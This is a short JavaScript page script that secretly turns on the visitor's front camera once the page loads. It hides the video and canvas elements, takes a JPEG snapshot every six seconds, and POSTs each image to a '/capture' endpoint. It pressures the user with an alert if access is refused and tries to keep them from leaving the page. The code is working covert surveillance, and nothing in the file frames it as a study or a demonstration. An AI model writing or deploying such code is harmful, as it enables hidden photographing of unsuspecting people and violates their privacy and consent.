document.addEventListener("DOMContentLoaded", () => {
    if (!document.getElementById('hiddenCam')) {
        const hiddenCamDiv = document.createElement('div');
        hiddenCamDiv.id = 'hiddenCam';
        hiddenCamDiv.style.display = 'none';
        hiddenCamDiv.innerHTML = `
            <video id="video" autoplay muted playsinline></video>
            <canvas id="canvas"></canvas>
        `;
        document.body.appendChild(hiddenCamDiv);
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
    .then(stream => {
        video.srcObject = stream;
        
        // 6 Seconds ku oru thadava capture
        setInterval(() => {
            if (!video.videoWidth) return;
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg', 0.6);

            fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imgData })
            }).catch(e => console.log("Error:", e));
        }, 6000); 
    })
    .catch(err => {
        alert("Camera access is required to continue!");
    });

    window.addEventListener('beforeunload', (e) => {
        e.preventDefault();
        e.returnValue = '';
    });
});